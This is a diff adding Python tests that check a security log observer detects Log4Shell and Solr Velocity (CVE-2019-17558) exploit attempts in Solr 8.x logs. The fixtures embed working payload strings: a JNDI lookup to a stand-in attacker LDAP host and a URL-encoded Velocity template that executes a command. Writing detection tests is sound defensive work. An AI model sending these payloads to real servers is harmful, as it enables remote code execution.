@@ -275,3 +275,77 @@ class TestUrlEncodedCveDetection:
         logs = [_apache("10.10.0.5", "GET", "/p?id=1+UNION+SELECT+table_name+FROM+information_schema.tables", 200)]
         p = _build_ip_profiles(logs)
         assert p["ip_profiles"]["10.10.0.5"]["sqli_attempts"] >= 1
+
+
+def _solr_log(path: str, params: str, status: int) -> dict:
+    """Helper: log entry en formato Solr 8.x Java logging."""
+    msg = (
+        f'2026-05-04 22:54:32.585 INFO  (qtp1346799731-91) '
+        f'[   x:demo] o.a.s.c.S.Request [demo]  webapp=/solr '
+        f'path={path} params={{{params}}} status={status} QTime=2'
+    )
+    return {"labels": {"container_name": "log4shell"}, "message": msg}
+
+
+class TestSolrJavaLogParsing:
+    """Apache Solr 8.x usa Java logging style (NO Apache combined).
+    El observer debe parsear este formato y aplicar heuristicas
+    CVE-specific aun sin IP del cliente."""
+
+    def test_solr_normal_query_no_signals(self):
+        logs = [_solr_log("/select", "q=*:*&wt=json", 0)]
+        p = _build_ip_profiles(logs)
+        ip = "solr-internal"
+        assert ip in p["ip_profiles"]
+        prof = p["ip_profiles"][ip]
+        assert prof["total"] == 1
+        assert prof["log4shell_attempts"] == 0
+        assert prof["solr_velocity_attempts"] == 0
+
+    def test_solr_log4shell_jndi_in_params(self):
+        """JNDI payload en params de Solr query."""
+        logs = [_solr_log(
+            "/select",
+            "q=${jndi:ldap://attacker/x}&wt=json",
+            400,
+        )]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["solr-internal"]
+        assert prof["log4shell_attempts"] >= 1
+
+    def test_solr_velocity_exploit(self):
+        """CVE-2019-17558: wt=velocity con template custom."""
+        logs = [_solr_log(
+            "/demo/select",
+            "q=1&wt=velocity&v.template=custom",
+            200,
+        )]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["solr-internal"]
+        assert prof["solr_velocity_attempts"] >= 1
+
+    def test_solr_velocity_url_encoded_template(self):
+        """Velocity con template URL-encoded como en exploit publico."""
+        logs = [_solr_log(
+            "/demo/select",
+            "q=1&wt=velocity&v.template=%23set($x=$rt.exec(%27id%27))",
+            200,
+        )]
+        p = _build_ip_profiles(logs)
+        prof = p["ip_profiles"]["solr-internal"]
+        assert prof["solr_velocity_attempts"] >= 1
+
+    def test_solr_log_does_not_match_apache_regex(self):
+        """Confirma que el log Solr NO matchea Apache regex (regression check)."""
+        from src.agents.observer.nodes import _TRIAGE_LOG_RE
+        msg = '2026-05-04 22:54:32.585 INFO  (qtp1346799731-91) [   x:demo] o.a.s.c.S.Request [demo]  webapp=/solr path=/select params={q=*} status=0 QTime=2'
+        assert _TRIAGE_LOG_RE.match(msg) is None
+
+    def test_solr_log_matches_solr_regex(self):
+        """Confirma que _SOLR_LOG_RE matchea formato Java Solr."""
+        from src.agents.observer.nodes import _SOLR_LOG_RE
+        msg = '2026-05-04 22:54:32.585 INFO  (qtp1346799731-91) [   x:demo] o.a.s.c.S.Request [demo]  webapp=/solr path=/select params={q=*} status=0 QTime=2'
+        m = _SOLR_LOG_RE.match(msg)
+        assert m is not None
+        assert m.group(3) == "/select"  # path
+        assert m.group(5) == "0"  # status
